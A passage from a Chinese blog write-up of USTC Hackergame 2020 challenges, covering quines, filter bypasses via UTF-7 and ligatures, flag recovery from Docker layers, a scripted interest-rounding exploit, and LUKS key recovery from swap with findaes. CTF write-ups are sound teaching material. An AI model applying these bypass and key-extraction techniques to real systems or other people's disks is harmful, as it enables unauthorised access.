code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span 